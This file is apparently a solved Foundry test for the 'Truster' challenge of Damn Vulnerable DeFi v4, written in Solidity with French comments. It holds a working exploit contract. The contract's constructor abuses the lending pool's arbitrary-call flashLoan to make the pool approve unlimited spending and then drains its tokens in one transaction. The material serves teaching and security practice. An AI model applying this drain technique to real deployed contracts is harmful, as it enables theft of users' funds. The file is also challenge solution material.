// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

interface IERC20Like {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface ITrusterPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external;
}

// @dev Contrat déployé par le player (UNE transaction):
///      Son constructeur exécute: flashLoan(0, ...) -> token.approve(this, MAX) depuis le pool,
///      puis transferFrom(pool -> recovery) pour drainer les fonds.
contract TrusterDeployAndDrain {
    constructor(address pool, address token, address recovery) {
        // 1) Faire exécuter par le pool: token.approve(address(this), type(uint256).max)
        bytes memory data = abi.encodeWithSelector(
            IERC20Like.approve.selector,
            address(this),
            type(uint256).max
        );
        ITrusterPool(pool).flashLoan(0, address(this), token, data);

        // 2) Utiliser l'allowance pour drainer tout vers l'adresse de recovery
        uint256 bal = IERC20Like(token).balanceOf(pool);
        IERC20Like(token).transferFrom(pool, recovery, bal);
    }
}


contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        // Une seule opération sous prank(player): déployer le contrat qui effectue l’exploit dans son constructeur
        new TrusterDeployAndDrain(address(pool), address(token), recovery);      
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
